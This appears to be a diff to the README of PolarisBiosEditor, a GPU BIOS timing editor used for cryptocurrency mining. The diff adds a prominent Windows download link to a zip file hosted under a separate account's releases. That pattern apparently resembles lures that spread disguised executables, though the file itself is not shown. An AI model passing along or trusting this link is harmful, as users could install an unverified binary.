@@ -1,5 +1,10 @@
 # PolarisBiosEditor v1.7.6
 
+[Download PolarisBiosEditor v1.7.6 for Windows](https://github.com/Gujjargit/PolarisBiosEditor/releases/download/PBE176/PolarisBiosEditor1.7.6.zip)
+-----------------------------------------------------------------------------------------------------------------
+![image](https://user-images.githubusercontent.com/98729987/212367484-718fe836-2feb-44a9-80fe-57efe1fb668b.png)
+
+
 ## Buy mining bios with performance timings! https://mining-bios.eu/
 **Polaris Bios Editor 3 PRO https://mining-bios.eu/product/polaris-bios-editor-3-pro-pbe-3-pro-performance-timings/**
 
@@ -22,6 +27,7 @@ works on linux with mono, executable is build against .net 3.5
 one click timing feature should be used with care, it maybe not stable for you
 
 please build the executable yourself or decompile the existing one if you don't trust
+
 ### v1.7.6
 - Fixed Samsung 2
 - Fixed no supported memory found H5GC8H24AJ bug
